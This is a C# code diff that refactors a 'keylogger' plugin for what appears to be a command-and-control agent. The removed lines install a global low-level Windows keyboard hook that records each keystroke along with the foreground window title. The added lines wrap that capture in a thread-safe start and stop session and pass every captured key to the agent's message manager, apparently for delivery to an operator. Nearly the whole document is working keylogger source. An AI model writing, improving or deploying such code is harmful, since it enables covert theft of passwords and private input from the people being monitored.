@@ -33,90 +33,120 @@ namespace Agent
     public class Plugin : IPlugin
     {
         public string Name => "keylogger";
-        private bool isRunning = false;
-        public string task_id = String.Empty;
-        public CancellationTokenSource cts = new CancellationTokenSource();
-        private ConcurrentQueue<Keystroke> keyQueue = new ConcurrentQueue<Keystroke>();
-        private delegate void KeyboardEvent();
-        private event KeyboardEvent OnKbHappened;
+        private readonly object stateLock = new();
+        private readonly IKeyboardHook keyboardHook;
+        private KeyloggerSession? session;
         private IMessageManager messageManager { get; set; }
 
+        private sealed class KeyloggerSession
+        {
+            public KeyloggerSession(string taskId, CancellationTokenSource cancellation, Action<string, string> handler)
+            { TaskId = taskId; Cancellation = cancellation; Handler = handler; }
+            public string TaskId { get; }
+            public CancellationTokenSource Cancellation { get; }
+            public Action<string, string> Handler { get; }
+            public Task RunTask { get; set; } = Task.CompletedTask;
+        }
+
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+            : this(messageManager, config, logger, tokenManager, spawner, pythonManager, new NativeKeyboardHook())
+        {
+        }
+
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager, IKeyboardHook keyboardHook)
         {
             this.messageManager = messageManager;
+            this.keyboardHook = keyboardHook;
         }
         public async Task Execute(ServerJob job)
         {
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            if (args["action"].ToLower() == "stop")
+            if (!args.TryGetValue("action", out string? action))
             {
-                if (this.isRunning)
-                {
-                    cts.Cancel();
-                    this.isRunning = false;
-                    messageManager.WriteLine("Tasked to stop.", job.task.id, true);
-                }
-                else
-                {
-                    messageManager.WriteLine("Task is not running.", job.task.id, true);
-                }
+                messageManager.WriteLine("Failed to parse action.", job.task.id, true, "error");
                 return;
             }
 
-            if(!this.isRunning)
+            if (action.Equals("stop", StringComparison.OrdinalIgnoreCase))
             {
-                cts = new CancellationTokenSource();
-                StartKeylogger(job.task.id);
-                messageManager.WriteLine("Keylogger started.", job.task.id, true);
+                await StopAsync(job.task.id).ConfigureAwait(false);
             }
             else
             {
-                messageManager.WriteLine("Already running", job.task.id, true);
+                Start(job.task.id);
             }
+
         }
-        public bool StartKeylogger(string task_id)
+
+        private void Start(string taskId)
         {
-            this.isRunning = true;
-            this.task_id = task_id;
-            this.OnKbHappened += Kl_OnKbHappened;
-            try
+            KeyloggerSession current;
+            lock (stateLock)
             {
-                Native.HookProc callback = CallbackFunction;
-                var module = Process.GetCurrentProcess().MainModule.ModuleName;
-                var moduleHandle = Native.GetModuleHandle(module);
-                var hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
-                while (!cts.Token.IsCancellationRequested)
+                if (session is not null)
                 {
-                    Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                    Thread.Sleep(5);
+                    messageManager.WriteLine("Already running", taskId, true);
+                    return;
                 }
 
-                Native.UnhookWindowsHookEx(hook);
+                var cancellation = new CancellationTokenSource();
+                Action<string, string> handler = (window, key) =>
+                    messageManager.AddKeystroke(window, taskId, key);
+                current = new KeyloggerSession(taskId, cancellation, handler);
+                keyboardHook.KeyPressed += handler;
+                session = current;
+            }
 
-                messageManager.WriteLine("Finished executing.", task_id, true);
+            current.RunTask = RunHookAsync(current);
+            messageManager.WriteLine("Keylogger started.", taskId, true);
+        }
+
+        private async Task StopAsync(string taskId)
+        {
+            KeyloggerSession? current;
+            lock (stateLock)
+            {
+                current = session;
+                if (current is null)
+                {
+                    messageManager.WriteLine("Task is not running.", taskId, true);
+                    return;
+                }
+
+                current.Cancellation.Cancel();
+            }
+            await current.RunTask.ConfigureAwait(false);
+            messageManager.WriteLine("Tasked to stop.", taskId, true);
+        }
+
+        private async Task RunHookAsync(KeyloggerSession current)
+        {
+            try
+            {
+                await keyboardHook.RunAsync(current.Cancellation.Token);
+            }
+            catch (OperationCanceledException) when (current.Cancellation.IsCancellationRequested)
+            {
             }
             catch (Exception ex)
             {
-                messageManager.WriteLine(ex.ToString(), task_id, true);
-                return false;
+                messageManager.WriteLine(ex.ToString(), current.TaskId, true, "error");
             }
-
-
-            return true;
+            finally
+            {
+                lock (stateLock)
+                {
+                    keyboardHook.KeyPressed -= current.Handler;
+                    if (ReferenceEquals(session, current))
+                    {
+                        session = null;
+                    }
+                }
+                current.Cancellation.Dispose();
+            }
         }
 
-        private void Kl_OnKbHappened()
-        {
-            Keystroke ks;
-
-            if (this.keyQueue.TryDequeue(out ks)) {
-                string key = ConvertKeyStroke(ks.keyCode);
-                messageManager.AddKeystroke(ks.GetWindowTitle(), this.task_id, key);
-            }
-            return;
-        }
-
-        private string ConvertKeyStroke(int ks)
+        internal static string ConvertKeyStroke(int ks)
         {
             string key = string.Empty;
             bool shift = (Native.GetAsyncKeyState(0x10) & 0x8000) != 0;
@@ -320,22 +350,6 @@ namespace Agent
             }
 
             return key;
-        }
-        private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
-        {
-            if (code >= 0 && (wParam == 0x100 || wParam == 0x104))
-            {
-                IntPtr hWindow = Native.GetForegroundWindow();
-                if (hWindow != IntPtr.Zero)
-                {
-                    int vKey = Marshal.ReadInt32(lParam);
-                    Keystroke ks = new Keystroke(hWindow, vKey);
-                    this.keyQueue.Enqueue(ks);
-                    this.OnKbHappened?.Invoke();
-                }
-
-            }
-            return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
     }
 }
